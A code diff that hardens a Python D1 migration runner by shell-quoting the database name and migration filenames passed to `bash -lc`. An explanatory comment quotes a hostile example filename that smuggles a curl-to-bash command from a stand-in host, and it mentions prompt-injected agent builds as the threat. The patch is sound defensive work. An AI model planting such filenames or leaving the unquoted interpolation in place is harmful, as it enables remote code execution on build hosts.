@@ -9,6 +9,7 @@ from __future__ import annotations
 
 import os
 import re
+import shlex
 import subprocess
 from pathlib import Path
 from typing import Optional
@@ -88,10 +89,16 @@ def provision_d1(app_dir: str | Path) -> tuple[bool, str]:
             sqls = sorted((app / "migrations").glob("*.sql"))
             applied = 0
             for sql in sqls:
+                # shlex.quote the db name AND the migration filename — `sql.name`
+                # is an agent-authored filename (a clone/prompt-injected build can
+                # plant `0001$(curl evil|bash).sql`), so an unquoted interpolation
+                # into `bash -lc` is a command-injection sink (the Vercel path
+                # already quotes; this closes the asymmetry).
+                mig = shlex.quote(f"migrations/{sql.name}")
                 m = subprocess.run(
                     ["bash", "-lc",
-                     f"printf 'y\\n' | npx -y wrangler d1 execute {db} --remote "
-                     f"--file=migrations/{sql.name} 2>&1"],
+                     f"printf 'y\\n' | npx -y wrangler d1 execute {shlex.quote(db)} "
+                     f"--remote --file={mig} 2>&1"],
                     cwd=str(app), capture_output=True, text=True, env=_env(),
                 )
                 out = (m.stdout + m.stderr).lower()
